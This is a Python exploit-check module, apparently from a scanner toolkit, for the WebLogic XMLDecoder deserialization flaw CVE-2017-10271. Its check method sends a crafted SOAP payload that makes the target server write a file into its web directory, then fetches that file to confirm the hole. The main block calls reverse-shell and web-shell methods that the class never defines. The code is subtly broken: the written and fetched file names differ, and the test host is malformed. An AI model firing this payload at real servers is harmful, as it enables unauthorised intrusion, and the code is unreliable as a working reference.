#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.common import get_capta, get_useragent

class CVE_2017_10271_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2017-10271',
            'description': 'Weblogic XMLDecoder Deserialize Vulnerability, 受影响版本: Weblogic 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0',
            'date': '2017-10-19',
            'exptype': 'check',
            'type': 'Deserialize'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'text/xml'
        }
        
    def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_payload = '''
                        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                        <soapenv:Header>
                        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                        <java><java version="1.4.0" class="java.beans.XMLDecoder">
                        <object class="java.io.PrintWriter">
                        <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/check.txt</string>
                        <void method="println">
                        <string>
                        <![CDATA[<%This is a Test%>]]>
                        </string>
                        </void><void method="close"/>
                        </object></java></java>
                        </work:WorkContext>
                        </soapenv:Header>
                        <soapenv:Body/>
                        </soapenv:Envelope>
                       '''
            result = request.post(self.url + "/wls-wsat/CoordinatorPortType", headers = self.headers, data = check_payload)
            check = request.get(self.url +  '/bea_wls_internal/check.text')
            if check.status_code == 200 and 'This is a Test' in check.text:
                return True
            else:
                return False
        except Exception as e:
            return False, e
        finally:
            pass

if  __name__ == "__main__":
    CVE_2017_10271 = CVE_2017_10271_BaseVerify('http://127.0.01:7001')
    print(CVE_2017_10271.reverse('127.0.0.1', '9999'))
    print(CVE_2017_10271.webshell('test'))
